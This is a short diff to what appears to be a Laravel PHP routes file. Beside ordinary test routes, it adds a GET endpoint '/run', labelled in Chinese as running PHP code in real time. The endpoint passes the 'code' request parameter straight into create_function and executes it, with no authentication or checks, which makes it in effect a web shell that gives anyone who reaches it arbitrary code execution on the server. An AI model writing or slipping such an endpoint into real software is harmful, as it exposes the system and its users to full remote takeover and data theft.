@@ -30,6 +30,17 @@ use Illuminate\Http\Request;
 		throw new Exception('My first Sentry error!');
 	});
 
+	/**
+	 * 实时运行PHP code
+	 */
+	Route::get('/run', function (Request $request) {
+        $code = $request->input('code');
+        $newfunc = create_function('', $code);
+        $res = $newfunc();
+	});
+
+
+
 
 	Route::get('/helloworld/','HelloWorldController@show_list');
 	Route::get('/kafka/producter','KafkaController@producter');
